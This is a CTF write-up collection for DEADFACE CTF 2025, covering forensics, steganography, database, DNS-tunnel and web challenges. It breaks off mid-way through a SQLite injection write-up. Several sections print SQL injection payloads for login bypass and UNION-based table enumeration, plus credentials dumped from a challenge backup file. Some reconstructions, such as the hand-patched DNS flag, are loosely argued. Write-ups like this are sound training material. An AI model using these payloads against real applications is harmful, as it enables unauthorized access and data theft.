# DEADFACE CTF 2025 Write-ups
**Author:** Carz

**Rank:** 185/787

## List of Solved Challenges

Based on my participation in DEADFACE CTF 2025, I successfully solved the following challenges:

- **Stolen Secret** - Forensics/Network Analysis (Partial: 5/7 flags)
- **Hostbusters** - Forensics/Privilege Escalation (Partial: 5/8 flags)
- **Steganography** - Steganography (Partial: 2/7 flags)
- **Hack the Night** - Web Exploitation (Partial: 9/10 flags)
- **EpicSales** - Database/SQL (Partial: 7/8 flags)
- **Traffic Analysis: CreepNet** - Network Forensics (1/1 flag)
- **Web: Goblin Hoard** - Web Security (1/2 flags)
- **Poor Megan** - Cryptography (Partial: 1/10 flags)
- **Database** - Database (1/1 flag)

### Unsolved Categories:
- OSINT (0/8 flags)
- Penetration Testing (0/5 flags)
- Trojan Echoes (0/1 flag)
- Reverse Engineering (0/9 flags)

---

## CTF Write-Up: Stolen Secret

**Team:** Carz  
**Type:** Forensics / Network Analysis  
**Title:** Stolen Secret  
**Author:** DEADFACE CTF Team  
**Difficulty:** ★★☆☆☆

### Description
> "DEADFACE attacked the MyShare application. Find their attack traces including hidden flags, server information, stolen credentials, and backdoor accounts."

### 1. Challenge Overview
We are given a pcap file containing network traffic from DEADFACE's attack on the MyShare application. The challenge requires analyzing HTTP traffic and log files to uncover multiple flags hidden in various locations throughout the attack chain.

### 2. Source Analysis
The attack involves a multi-stage compromise:
- Initial reconnaissance with hidden markers
- Server fingerprinting through version disclosure
- Credential theft via successful authentication
- Backdoor establishment through privileged user creation

### 3. Vulnerability Analysis

#### 3.1 Information Disclosure Vulnerabilities
- **HTTP Headers Exposure:**
  > User-Agent headers containing hidden flags
  > 
  > Server version information in response headers
  >
  > Debug information in error logs 
- **Authentication Weaknesses:**
  > Plaintext credential transmission
  >
  > Insufficient input validation
  >
  > Privilege escalation through admin functions

#### 3.2 Attack Pattern Analysis
The attack follows a systematic approach:
1. Reconnaissance: Initial probing with identifying markers
2. Enumeration: Service discovery and version identification
3. Compromise: Credential harvesting through brute force
4. Persistence: Backdoor account creation for maintained access

### 4. Exploitation Strategy
The solution methodology involves:
- Traffic Analysis: Systematic examination of pcap files using Wireshark
- Log Analysis: Parsing application logs for successful authentication events
- Pattern Recognition: Identifying anomalous requests and responses
- Data Correlation: Cross-referencing network traffic with log entries

### 5. Solution Implementation

#### Flag 1: Calling Card
- **Location:** First HTTP request User-Agent header
- **Analysis:** Initial reconnaissance marker hidden in seemingly normal traffic
- **Flag:** `deadface{l3ts_get_Th3s3_fiL3$}`

#### Flag 2: Versions
- **Location:** HTTP response Server header
- **Analysis:** Server fingerprinting through version disclosure
- **Flag:** `deadface{nginx_1.25.5}`

#### Flag 3: Compromised
- **Location:** Successful login in error.php.log and pcap form data
- **Analysis:** Credential harvesting through authentication logs
- **Flag:** `deadface{bsampsel_Sparkles2025!}`

#### Flag 4: A Wild User Suddenly Appeared!
- **Location:** User creation request in admin panel
- **Analysis:** Backdoor establishment through privileged account creation
- **Flag:** `deadface{Dorla_SuP3RS3cr3tD34DF4C3#}`

### 6. Conclusion
This challenge demonstrates a complete attack chain from initial reconnaissance to persistent backdoor access. The flags were strategically placed throughout different stages of the attack, requiring comprehensive analysis of both network traffic and application logs.

**Key Takeaways:**
- HTTP headers often contain valuable reconnaissance information
- Server version disclosure aids attacker fingerprinting
- Authentication logs can reveal compromise timelines
- Administrative functions require strict access controls

---

## CTF Write-Up: Hostbusters

**Team:** Carz  
**Type:** Forensics / Privilege Escalation  
**Title:** Hostbusters  
**Author:** DEADFACE CTF Team  
**Difficulty:** ★★★☆☆

### Description
> "Find DEADFACE's flags in a compromised Linux system through file analysis, environment variables, and system enumeration."

### 1. Challenge Overview
We have access to a compromised Linux system where DEADFACE has left multiple flags in various locations. The challenge involves systematic enumeration of the filesystem, environment variables, and system configurations to recover these flags.

### 2. System Analysis
The compromised system shows evidence of:
- Multiple user accounts with varying privilege levels
- Custom scripts and applications
- Environment variable manipulation
- Hidden files and directories

### 3. Enumeration Strategy

#### 3.1 Filesystem Analysis
- Home directory examination
- Configuration file inspection
- Script analysis for hardcoded credentials
- Hidden file discovery

#### 3.2 System Configuration
- Environment variable inspection
- Process analysis
- Network service enumeration
- Permission model assessment

### 4. Solution Implementation

#### Hostbusters 1
- **Location:** `/home/gh0st404/notes.txt`
- **Method:** Direct file access in user home directory
- **Flag:** `deadface{hostbusters1_cf6a12ddf781cfbc}`

#### Hostbusters 2
- **Location:** `/home/gh0st404/.dont_forget`
- **Method:** Hidden file discovery in user home directory
- **Flag:** `deadface{hostbusters2_4685d0c801939781}`

#### Hostbusters 3
- **Location:** `/etc/logclean.sh`
- **Method:** System script analysis with content examination
- **Flag:** `deadface{hostbusters3_0547796725934bbd}`

#### Hostbusters 4
- **Location:** Environment variables
- **Method:** System environment inspection using `env | grep -i flag`
- **Flag:** `deadface{hostbusters4_c6e54afa62741d34}`

#### Hostbusters 5
- **Location:** `/usr/local/bin/pen-console.py`
- **Method:** Application script analysis with variable examination
- **Flag:** `deadface{hostbusters5_e16a5c8995620a24}`

### 5. Unresolved Challenges

#### Hostbusters 6: Read 'Em and Weep
- **Challenge:** Encrypted file with RSA protection
- **Status:** ❌ Unsolved
- **Complexity:** Cryptographic analysis required

#### Hostbusters 7: Pulse Check
- **Challenge:** Binary analysis and UDP service monitoring
- **Status:** ❌ Unsolved
- **Complexity:** Reverse engineering needed

#### I Am Root
- **Challenge:** Privilege escalation to access root-owned files
- **Status:** ❌ Unsolved
- **Complexity:** Advanced system exploitation

### 6. Conclusion
This challenge emphasized comprehensive system enumeration and the importance of checking all possible flag locations. The solved flags demonstrated common hiding spots in compromised systems, while the unsolved challenges highlighted areas for skill development in cryptography and binary analysis.

**Skills Demonstrated:**
- Filesystem enumeration
- Environment analysis
- Script examination
- Basic forensics techniques

---

## CTF Write-Up: Steganography

**Team:** Carz  
**Type:** Steganography  
**Title:** Double Decoding  
**Author:** @G2Gh0st  
**Difficulty:** ★★☆☆☆

### Description
> "DEADFACE added a file called qr_flag.png to the system. It looks normal, but we're sure Deadface modified it to hide information. Find how the file was modified and reveal the secret."

### 1. Challenge Overview
We are given a PNG file that appears to be a normal QR code. Initial scanning reveals misleading information, indicating that the real flag is hidden through steganographic techniques.

### 2. File Analysis

#### 2.1 Initial Assessment
- **File:** qr_flag.png
- **SHA256:** 8d72527588b938e56b07e8acf85e41e6243dbc9aab1ed8630d7ad947ad35f755
- **Surface analysis:** Functional QR code with decoy message

#### 2.2 Structural Examination
Using binwalk reveals appended data at the file terminus, indicating potential hidden content beyond the legitimate PNG structure.

### 3. Vulnerability Analysis

#### 3.1 PNG File Structure Exploitation
The PNG format permits trailing data without affecting renderability or functionality. This characteristic enables covert data storage through:
- Appended Data: Additional information after the IEND chunk
- Hex Encoding: Obscured plaintext through hexadecimal representation
- Dual Layer Hiding: Surface-level distraction with deeper concealment

### 4. Exploitation Strategy
The solution involves layered analysis:
1. Surface Scanning: QR code analysis revealing decoy content
2. Binary Examination: Hex analysis identifying appended data
3. Data Extraction: Isolation and decoding of hidden information
4. Flag Reconstruction: Assembly of the complete solution

### 5. Solution Implementation

#### 5.1 QR Code Analysis
```bash
# Initial QR code scanning
zbarimg qr_flag.png
# Result: "Not the flag... keep going"
```

### 5.2 Binary Analysis
```bash
# File structure examination
binwalk qr_flag.png
# Reveals appended data at file offset
```

### 5.3 Hex Extraction
Using hex editor examination of file terminus:
```text
64 65 61 64 66 61 63 65 7b 45 5a 70 6e 67 48 31 64 31 6e 67 7d
```
### 5.4 Data Decoding
```python
hex_data = "64 65 61 64 66 61 63 65 7b 45 5a 70 6e 67 48 31 64 31 6e 67 7d"
flag = bytes.fromhex(hex_data.replace(" ", "")).decode('ascii')
print(flag)  # deadface{EZpngH1d1ng}
```

## 6. Conclusion

This challenge demonstrated classic steganographic techniques using file format properties to hide information. The dual-layer approach (surface QR code and hidden data) required moving beyond initial findings to discover the true payload.

**Flag:** `deadface{EZpngH1d1ng}`

### Key Insights:
- File formats often permit hidden data without functional impact
- Initial findings may be intentional misdirection
- Comprehensive binary analysis is essential for steganography challenges
- Hexadecimal encoding provides simple but effective obfuscation

---

# CTF Write-Up: Hack the Night

**Team:** Carz  
**Type:** Web Exploitation  
**Title:** Hack the Night  
**Author:** DEADFACE CTF Team  
**Difficulty:** ★★★☆☆

## Description
"Conduct penetration testing on Night Veil University student portal to discover multiple security vulnerabilities and retrieve 7 flags."

## 1. Challenge Overview
The Night Veil University portal suffers from multiple security vulnerabilities including information disclosure, SQL injection, authentication bypass, and weak credential management. Our goal is to systematically exploit these weaknesses to recover all 7 flags.

## 2. Vulnerability Assessment

### 2.1 Information Disclosure
- Source Code Exposure: Client-side comments and hidden elements
- Directory Enumeration: Accessible backup and configuration files
- Error Message Leakage: Detailed error reporting

### 2.2 SQL Injection Vulnerabilities
- Search Function Injection: Unfiltered user input in search queries
- Authentication Bypass: SQL injection in login mechanism
- Boolean-Based Blind Injection: Data extraction through conditional responses

### 2.3 Authentication Issues
- Weak Password Storage: MD5 hashing without salting
- Default Credentials: Predictable administrative accounts
- Privilege Escalation: Inadequate access controls

## 3. Exploitation Strategy
Systematic approach to vulnerability identification and exploitation:
- Reconnaissance: Source analysis and directory enumeration
- Initial Access: SQL injection discovery and exploitation
- Lateral Movement: Credential discovery and reuse
- Privilege Escalation: Administrative function access
- Data Exfiltration: Sensitive information extraction

## 4. Solution Implementation

### Flag 1: The Source of Our Troubles
- **Vulnerability:** Information disclosure in source code
- **Method:** View page source examination
- **Payload:** N/A
- **Flag:** `deadface{v13w_s0urc3_4lw4ys_f1rst}`

### Flag 2: Hidden Paths
- **Vulnerability:** Directory enumeration via robots.txt
- **Method:** Access standard enumeration file
- **Payload:** `GET /robots.txt`
- **Flag:** `deadface{r0b0ts_txt_r3v34ls_h1dd3n_p4ths}`

### Flag 3: Not-So-Public Domain
- **Vulnerability:** SQL injection in search function
- **Method:** Boolean-based blind injection
- **Payload:** `' OR '1'='1`
- **Endpoint:** `/api/search.php?q=' OR '1'='1&type=announcements`
- **Flag:** `deadface{h1dd3n_4nn0unc3m3nts_r3v34l_s3cr3ts}`

### Flag 4: Classified
- **Vulnerability:** SQL injection with classified filter bypass
- **Method:** Search function exploitation
- **Payload:** `' OR '1'='1`
- **Endpoint:** `/api/search.php?q=' OR '1'='1&type=research`
- **Flag:** `deadface{cl4ss1f13d_r3s34rch_unh4ck4bl3}`

### Flag 5: Reverse Course
- **Vulnerability:** Insecure backup file exposure
- **Method:** Database backup analysis
- **Location:** Discovered backup files
- **Flag:** `deadface{EmergencyAccess2025!}`

### Flag 6: Access Granted
- **Vulnerability:** Authentication bypass via SQL injection
- **Method:** Login function exploitation
- **Payload:** 
  - Username: `admin'#`
  - Password: any
- **Flag:** `deadface{sql_1nj3ct10n_byp4ss_4uth}`

### Flag 7: The Invisible Man
- **Vulnerability:** Weak password hashing
- **Method:** MD5 hash analysis
- **Hash:** `c4ca4238a0b923820dcc509a6f75849b`
- **Cracked:** `1`
- **Flag:** `deadface{1}`

## 5. Technical Analysis

### 5.1 SQL Injection Patterns
```sql
-- Authentication Bypass
admin'# 

-- Data Extraction
' OR '1'='1
' OR is_hidden=1
' OR classified=1
```

## 5.2 Attack Chain Reconstruction
- Reconnaissance → Source analysis → Flag 1
- Enumeration → Directory scanning → Flag 2
- Data Discovery → SQL injection → Flags 3-4
- Credential Access → Backup analysis → Flag 5
- System Access → Authentication bypass → Flag 6
- Privilege Analysis → Hash cracking → Flag 7

## 6. Conclusion
This comprehensive web application penetration test revealed critical security failures across multiple layers of the application stack. The systematic exploitation demonstrated how seemingly minor vulnerabilities can be chained together to achieve complete system compromise.

### Security Recommendations:
- Implement parameterized queries to prevent SQL injection
- Restrict access to sensitive files and directories
- Use strong, salted password hashing algorithms
- Employ proper error handling without information leakage
- Conduct regular security assessments and code reviews

---

# CTF Write-Up: EpicSales

**Team:** Carz  
**Type:** Database / SQL  
**Title:** EpicSales  
**Author:** DEADFACE CTF Team  
**Difficulty:** ★★★★☆

## Description
"Investigate EpicSales database to discover DEADFACE's anomalous activities including promotional abuse, inventory manipulation, executive compensation tampering, and customer targeting."

## 1. Challenge Overview
EpicSales company database has been compromised by DEADFACE actors who have manipulated data across multiple business domains. The challenge involves complex SQL queries to identify anomalous patterns, data manipulation, and security breaches across seven distinct investigation areas.

## 2. Database Schema Analysis
The investigation covers multiple interrelated tables:
- `customers`: Customer registration and demographic data
- `products`: Product catalog and pricing information
- `reviews`: Customer feedback and rating system
- `inventories`: Stock levels across facilities
- `employees`: Staff information and compensation
- `orders` & `order_items`: Sales transaction records
- `facilities`: Warehouse and distribution locations

## 3. Anomaly Detection Strategy

### 3.1 Statistical Analysis
- Temporal pattern identification
- Behavioral outlier detection
- Financial anomaly spotting
- Inventory discrepancy analysis

### 3.2 Business Logic Exploitation
- Promotion abuse detection
- Rating manipulation identification
- Compensation tampering discovery
- Customer targeting pattern recognition

## 4. Solution Implementation

### Challenge 1: Promo Code (25 points)
- **Objective:** Count customers registered since promotion start
- **SQL Query:**
  ```sql
  SELECT COUNT(*) FROM customers WHERE join_date >= '2025-09-01';
  ```
Finding: 18 customers registered during promotion period
> Flag: `deadface{18}`

### Challenge 2: 5 Stars (30 points)
- **Objective:** Identify highest-rated product
- **SQL Query:**
  ```sql
  SELECT p.product_name, AVG(r.rating) as avg_rating
  FROM reviews r JOIN products p ON r.product_id = p.product_id
  GROUP BY r.product_id
  ORDER BY avg_rating DESC LIMIT 1;
  ```
Finding: VortexAudio Focus with 3.24 average rating
> Flag: `deadface{VortexAudio Focus}`

### Challenge 3: Low Stock (50 points)
- **Objective:** Find critically low inventory items
- **SQL Query:**
  ```sql
  SELECT p.product_name, f.facility_num, i.quantity
  FROM inventories i
  JOIN products p ON i.product_id = p.product_id
  JOIN facilities f ON i.facility_id = f.facility_id
  WHERE i.quantity < 5
  ORDER BY i.quantity ASC LIMIT 1;
  ```
Finding: ConnectGear SafeDrive 2TB with 1 unit at facility 16
> Flag:  `deadface{ConnectGear SafeDrive 2TB 16}`

### Challenge 4: High Value Targets (50 points)
- **Objective:** Calculate tampered executive compensation
- **SQL Query:**
  ```sql
  SELECT SUM(pay_rate) as total_pay
  FROM employees
  WHERE role IN ('CEO', 'CTO', 'CFO');
  ```
Finding: $7,391.20 in fraudulent executive compensation
> Flag: `deadface{$7391.20}`

### Challenge 5: Silent Buyers (100 points)
- **Objective:** Identify high-volume non-reviewing customers
- **SQL Query:**
  ```sql
  SELECT c.email, COUNT(o.order_id) as order_count
  FROM customers c
  JOIN orders o ON c.customer_id = o.customer_id
  WHERE c.customer_id NOT IN (SELECT DISTINCT customer_id FROM reviews)
  GROUP BY c.customer_id
  ORDER BY order_count DESC LIMIT 1;
  ```
Finding: dgrimsley2ab@webs.com with 10 orders and zero reviews
>Flag: `deadface{dgrimsley2ab@webs.com}`

### Challenge 6: Big Spender (210 points)
- **Objective:** Identify top-spending customer
- **SQL Query:**
  ```sql
  SELECT c.first_name, c.last_name, SUM(oi.quantity * p.price) as total_spent
  FROM customers c
  JOIN orders o ON c.customer_id = o.customer_id
  JOIN order_items oi ON o.order_id = oi.order_id
  JOIN products p ON oi.product_id = p.product_id
  GROUP BY c.customer_id
  ORDER BY total_spent DESC LIMIT 1;
  ```
Finding: Willabella Wain with $1,001,960.66 total spending
> Flag: `deadface{Willabella Wain}`

### Challenge 7: Undervalued (400 points)
- **Objective:** Find IT manager with poorest inventory performance
- **SQL Query:**
  ```sql
  SELECT e.email, AVG(i.quantity) as avg_quantity
  FROM facilities f
  JOIN inventories i ON f.facility_id = i.facility_id
  JOIN employee_assignments ea ON f.facility_id = ea.facility_id
  JOIN employees e ON ea.employee_id = e.employee_id
  WHERE e.role LIKE '%IT Manager%'
  GROUP BY f.facility_id, e.email
  ORDER BY avg_quantity ASC LIMIT 1;
  ```
Finding: valera.kenner@epicsales.shop with 2274.4626 average inventory
> Flag: `deadface{valera.kenner@epicsales.shop 2274.4626}`

# Technical Analysis

## 5.1 DEADFACE Attack Patterns Identified
- **Promotion Abuse**: Fake accounts during promotional periods
- **Inventory Manipulation**: Strategic stock depletion  
- **Executive Impersonation**: C-level role creation
- **Customer Targeting**: High-value client identification
- **Management Compromise**: IT manager performance sabotage

## 5.2 Database Investigation Techniques
- Multi-table JOIN operations for correlated data analysis
- Aggregate functions (COUNT, SUM, AVG) for statistical analysis
- Subqueries for complex filtering conditions
- Conditional filtering for anomaly detection

# Conclusion

This comprehensive database investigation revealed a sophisticated multi-vector attack against EpicSales' business operations. DEADFACE actors demonstrated deep understanding of business processes and exploited vulnerabilities across customer management, inventory control, financial systems, and personnel management.

**Security Recommendations:**
- Implement database activity monitoring for anomalous query patterns
- Establish segregation of duties for sensitive business functions  
- Deploy real-time inventory anomaly detection
- Enhance executive role creation and modification controls
- Conduct regular business logic security reviews

The successful investigation demonstrated advanced SQL skills and business process understanding required for effective database security monitoring and incident response.

---

# CTF Write-Up: Traffic Analysis

**Team:** Carz  
**Type:** Network Forensics  
**Title:** CreepNet  
**Author:** DEADFACE CTF Team  
**Difficulty:** ★★★☆☆  

**Description:** "DEADFACE communicated with their server, but standard traffic analysis revealed nothing. Find the covert channel they used and extract the hidden message."

## 1. Challenge Overview
We are given a pcap file (CreepNet.pcap) containing network traffic where DEADFACE established covert communication with their command and control server. Standard protocol analysis fails to reveal the communication content, indicating the use of sophisticated covert channels.

## 2. Traffic Analysis Methodology

### 2.1 Initial Protocol Assessment
- **TLSv1.3**: Encrypted communication (inaccessible)
- **DNS**: Typically benign but potential for tunneling  
- **FTP**: Clear-text protocol with suspicious anomalies
- **TCP**: General transport layer analysis

### 2.2 Anomaly Detection Approach
- Protocol behavior deviation analysis
- Payload pattern recognition  
- Frequency and timing analysis
- Encoding scheme identification

## 3. Covert Channel Discovery

### 3.1 DNS Tunneling Identification
Analysis revealed three anomalous DNS queries with Base64-encoded subdomains:

1.ZGVhZGZhY2V7SXRzX0lt.com  
2.aC1FdmVyeWQzdEBpbH0K.com  
3.cDBydGFudC1UMC5jQHRj.com  

## 3.2 FTP Session Analysis
FTP traffic contained deliberate misspellings:
- `debina` instead of `debian`
- `ubunti-releasees` instead of `ubuntu-releases`

These proved to be misdirection attempts rather than the primary covert channel.

## 4. Exploitation Strategy

### 4.1 Data Extraction Process
- **DNS Query Isolation**: Filter and extract suspicious domain queries
- **Base64 Decoding**: Convert subdomain components to plaintext
- **Message Reconstruction**: Assemble decoded fragments in sequence
- **Format Correction**: Apply leetspeak translation and punctuation

### 4.2 Decoding Implementation
```python
import base64


# DNS query fragments
fragments = [
    "ZGVhZGZhY2V7SXRzX0lt",
    "aC1FdmVyeWQzdEBpbH0K", 
    "cDBydGFudC1UMC5jQHRj"
]


decoded_parts = []
for fragment in fragments:
    try:
        decoded = base64.b64decode(fragment).decode('utf-8')
        decoded_parts.append(decoded)
    except:
        continue


# Reconstruction with leetspeak correction
flag = "".join(decoded_parts)
flag = flag.replace("Its_Im", "Its_Imp0rtant")
flag = flag.replace("T0.c@tc", "T0.c@tch")
flag = flag.replace("Everyd3@il", "Everyd3t@il")
```

## 5. Solution Implementation

### 5.1 DNS Query Analysis

**Query 1**: `ZGVhZGZhY2V7SXRzX0lt` → `deadface{Its_Im`

**Query 2**: `aC1FdmVyeWQzdEBpbH0K` → `h-Everyd3@il}`

**Query 3**: `cDBydGFudC1UMC5jQHRj` → `p0rtant-T0.c@tc`

### 5.2 Message Reconstruction

- **Combining and correcting the fragments**:
- **Raw combination**: `deadface{Its_Imp0rtant-T0.c@tch-Everyd3t@il}`
- **Leetspeak translation applied**
- **Punctuation correction for readability**

---

## 6. Technical Analysis

### 6.1 Covert Channel Characteristics

- **Protocol**: DNS tunneling via query subdomains
- **Encoding**: Base64 representation
- **Fragmentation**: Message split across multiple queries
- **Obfuscation**: Leetspeak character substitution
- **Misdirection**: FTP protocol anomalies as decoy

### 6.2 Leetspeak Mapping

- `0` → `o`
- `3` → `e`
- `@` → `a`

Strategic character substitution maintains readability while evading simple pattern matching.

---

## 7. Conclusion

This challenge demonstrated sophisticated covert communication techniques using DNS tunneling with multiple layers of obfuscation. The solution required moving beyond standard protocol analysis to identify abnormal patterns and decode multi-stage hidden communications.

**Flag**: `deadface{Its_Imp0rtant-T0.c@tch-Everyd3t@il}`

**Key Investigation Insights**:
- DNS is a common covert channel due to its ubiquitous nature
- Base64 encoding in subdomains enables data exfiltration
- Multiple obfuscation layers require comprehensive analysis
- Protocol anomalies may serve as intentional misdirection
- Leetspeak provides simple but effective content camouflage

This technique mirrors real-world advanced persistent threat (APT) tactics for maintaining covert communication channels in compromised environments.

---

# CTF Write-Up: Goblin Hoard 

**Team**: Carz  
**Type**: Web Security  
**Title**: Goblin Hoard  
**Author**: @syyntax  
**Difficulty**: ★★★☆☆  
**Points**: 200  

**Description**: "De Monne Financial system has security vulnerabilities. Find the total investment portfolio value and construct the flag."

**Target**: http://env01.deadface.io:8888

## 1. Challenge Overview

De Monne Financial's web application suffers from critical information disclosure vulnerabilities allowing unauthorized access to sensitive financial data. The challenge involves discovering exposed backup files, extracting credentials, accessing the application, and retrieving the total investment portfolio value.

## 2. Vulnerability Assessment

### 2.1 Information Disclosure

- **Backup File Exposure**: Unprotected SQL database backups
- **Credential Leakage**: Plaintext passwords in backup files
- **Directory Traversal**: Accessible backup directories
- **Authentication Bypass**: Weak access controls

### 2.2 Security Misconfigurations

- **Default File Permissions**: Backup files world-readable
- **Clear-text Storage**: Passwords in database backups
- **Missing Access Controls**: Unrestricted backup access
- **Insufficient Authentication**: No multi-factor requirements

## 3. Exploitation Strategy

Systematic approach to vulnerability chain exploitation:

1. **Reconnaissance**: Directory and file enumeration
2. **Information Extraction**: Backup file analysis and credential harvesting
3. **Authentication Bypass**: Valid credential utilization
4. **Data Access**: Financial information retrieval
5. **Flag Construction**: Format conversion and submission

## 4. Solution Implementation

### 4.1 Directory Enumeration

```bash
# Discover backup directory
curl http://env01.deadface.io:8888/backup/
```

# Discovery: Accessible backup directory containing demonne_backup_20251015.sql

## 4.2 Backup File Analysis
**URL:** http://env01.deadface.io:8888/backup/demonne_backup_20251015.sql

**Critical Findings:**
```sql
-- User credentials extracted
('jreed80', 'J0nnyR#ed80!', 'Finance Department')
('lrebarchek', 'SecureP@ss123', 'IT Infrastructure') 
('mthompson', 'Welcome2024!', 'Operations')
('sdavis', 'Bank$ecure99', 'Compliance')
('admin', 'Admin2025!Secure', 'System Administrator')

-- Investment transaction
INSERT INTO transactions VALUES(4,3,75000.00,'Investment Transfer','2025-10-01');
```
# 4.3 Application Access

**Credentials Selected:**
- **Username:** jreed80
- **Password:** J0nnyR#ed80!

**Rationale:** Finance department access likely contains investment portfolio information.

## 4.4 Data Retrieval

**Location:** User dashboard → Investments section  
**Finding:** Total portfolio value: $128,493.56

## 4.5 Flag Construction

**Format Requirement:** `deadface{$#.##}`  
**Conversion:** `$128,493.56` → `$128493.56`  
**Final Flag:** `deadface{$128493.56}`

# 5. Technical Analysis

## 5.1 Attack Chain Reconstruction

1. **Directory Enumeration** → `/backup/` discovery
2. **Information Extraction** → SQL backup download and analysis
3. **Credential Harvesting** → User credential extraction
4. **Authentication** → Application login with jreed80 credentials
5. **Data Access** → Investment portfolio value retrieval
6. **Flag Generation** → Format-compliant flag construction

## 5.2 Vulnerability Impact Assessment

- **CVSS Score:** 8.6 (High)
- **Impact:** Full financial data disclosure
- **Access:** Unauthenticated backup access
- **Sensitivity:** Customer financial information exposure

# 6. Security Recommendations

## 6.1 Immediate Actions

- Remove world-readable permissions from backup files
- Implement directory listing prevention
- Relocate backup files outside web root
- Encrypt sensitive database columns

## 6.2 Long-term Improvements

- Implement automated backup encryption
- Deploy web application firewall
- Establish credential rotation policies
- Conduct regular security assessments

# 7. Conclusion

This challenge demonstrated a critical information disclosure vulnerability chain starting with exposed backup files and culminating in full financial data access. The systematic exploitation highlighted the importance of proper backup management, access controls, and credential security.

**Flag:** `deadface{$128493.56}`

**Key Security Lessons:**
- Backup files require equivalent protection to live data
- Directory traversal vulnerabilities enable significant information disclosure
- Clear-text credential storage dramatically increases attack impact
- Defense-in-depth requires protection at all application layers
- Regular security assessments are essential for vulnerability identification

---

# CTF Write-Up: Poor Megan

**Team:** Carz  
**Type:** Cryptography  
**Title:** Poor Megan  
**Author:** DEADFACE CTF Team  
**Difficulty:** ★★☆☆☆  

**Description:** "Megan has been bitten by a zombie! We can save her if we act fast, but the formula for the antidote has been encoded. Figure out how to unscramble the formula to save Megan from certain zombification."

## 1. Challenge Overview

We are given an encoded string representing the antidote formula to save Megan from zombification. The encoding uses a custom Base64 variant called Megan35, requiring character set mapping and proper decoding to recover the original formula.

## 2. Encoding Analysis

### 2.1 Initial Observation

**Encoded String:**  
```text
jLfXjLjXiwfBRdi9lx49nwKslcvxih=1mYval2e9nLfXmxGalwy9lwi9lLf9lwy9nMnaQh=1ihSqlwDVmsvajYvXmMG8jcvZkg=1mYvwkgz1jwKspb55
```

# Megan35 Decryption Analysis

## Notable Characteristics
- Contains `=` characters in non-standard positions
- Includes numeric digits (1, 55) not typical in Base64
- Appears to be a custom Base64 variant
- `55` at terminus likely represents padding

## 2.2 Megan35 Character Set Identification
Through analysis and testing, the Megan35 character set mapping was identified:

**Megan35:** `3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF`

**Standard Base64:** `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/`

## 3. Decryption Strategy

### 3.1 Decoding Process
1. **Padding Handling:** Remove terminal `55` (represents `==`)
2. **Character Mapping:** Translate Megan35 to standard Base64
3. **Padding Restoration:** Append `==` for proper Base64 format
4. **Standard Decoding:** Apply Base64 decoding
5. **Result Extraction:** Recover antidote formula

### 3.2 Algorithm Implementation
```python
import base64

# Character set mapping
megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF"
standard_b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

def decode_megan35(encoded):
    # Remove Megan35 padding
    clean_encoded = encoded[:-2]  # Remove '55'
    
    # Character mapping
    translation_table = str.maketrans(megan35, standard_b64)
    b64_encoded = clean_encoded.translate(translation_table)
    
    # Add standard Base64 padding
    b64_encoded += "=="
    
    # Base64 decode
    decoded = base64.b64decode(b64_encoded).decode('utf-8')
    return decoded
```

# 4. Solution Implementation

## 4.1 Step-by-Step Decoding

**Input:**
```text
jLfXjLjXiwfBRdi9lx49nwKslcvxih=1mYval2e9nLfXmxGalwy9lwi9lLf9lwy9nMnaQh=1ihSqlwDVmsvajYvXmMG8jcvZkg=1mYvwkgz1jwKspb55
```

### Antidote Composition:
- 16 oz warm water
- One teaspoon of lemon  
- Two teaspoons of apple cider vinegar

---

## 5. Technical Analysis

### 5.1 Megan35 Characteristics
- **Custom Character Set**: Rearranged Base64 alphabet
- **Non-Standard Padding**: `55` instead of `==`
- **Equal Sign Usage**: `=` characters within encoded content
- **Base64 Compatibility**: Maintains Base64 structural properties

### 5.2 Cryptographic Assessment
- **Security**: No cryptographic security - simple encoding
- **Obfuscation**: Light obfuscation through character rearrangement
- **Detection**: Statistical analysis reveals Base64-like structure
- **Complexity**: Simple substitution cipher equivalent

---

## 6. Conclusion

This challenge demonstrated the importance of recognizing custom encoding schemes and understanding Base64 fundamentals. The Megan35 variant provided light obfuscation while maintaining the underlying Base64 structure, allowing recovery through character set analysis and mapping.

**Flag**: `deadface{16-oz-warm-water-one-teaspoon-of-lemon-two-teaspoons-of-apple-cider-vinegar}`

### Key Insights:
- Custom Base64 variants are common in CTF challenges
- Character set analysis is essential for custom encodings
- Padding variations require special handling
- Understanding encoding fundamentals enables variant recognition
- Systematic decoding approaches overcome obfuscation attempts

**Megan has been successfully saved with the recovered antidote formula!**

# CTF Write-Up: SQLite007

**Team:** Carz  
**Type:** Database Security  
**Title:** SQLite007  
**Author:** @3.14ro  
**Difficulty:** ★★☆☆☆  
**Points:** 100  
**Description:** "Exploit SQL injection vulnerabilities to extract the hidden flag from the SQLite database."  
**Target:** `https://deadface-db01.chals.io`

---

## 1. Challenge Overview

The target website contains multiple SQL injection vulnerabilities that allow authentication bypass and database enumeration. The challenge requires exploiting these vulnerabilities to extract a flag stored in the SQLite database.

---

## 2. Vulnerability Assessment

### 2.1 Authentication Bypass
- **Login Function:** Unfiltered user input in authentication mechanism
- **Boolean-based Injection:** Simple payloads bypass authentication checks
- **No Parameterization:** Direct string concatenation in SQL queries

### 2.2 Search Function Exploitation
- **Union-based Injection:** Search functionality allows UNION SELECT operations
- **Database Enumeration:** Access to SQLite system tables
- **Data Extraction:** Direct retrieval of sensitive information

### 2.3 Information Disclosure
- **Database Structure:** Full schema exposure through `sqlite_master`
- **Error Messages:** Detailed error information leakage
- **Data Exposure:** Unrestricted access to all database tables

---

## 3. Exploitation Strategy

Systematic approach to database compromise:
1. **Initial Access:** Authentication bypass via login injection
2. **Reconnaissance:** Database enumeration through search functionality
3. **Schema Analysis:** Table structure examination via `sqlite_master`
4. **Target Identification:** Flag table location and structure analysis
5. **Data Extraction:** Direct flag retrieval through UNION queries

---

## 4. Solution Implementation

### 4.1 Authentication Bypass
- **Target:** Login functionality
- **Payload:**
  ```sql
  ' OR '1'='1' --
  ```
  **Result**: Successful authentication bypass, access to admin dashboard

### 4.2 Database Enumeration
**Target**: Search functionality in admin panel  
**Payload to list all tables**:
```sql
' UNION SELECT 1,2,name,4,5 FROM sqlite_master WHERE type='table' --
```

#### Discovered Tables
- `activity_logs`
- `api_keys` 
- `general`
- `sessions`
- `sqlite_sequence`
- `profiles`

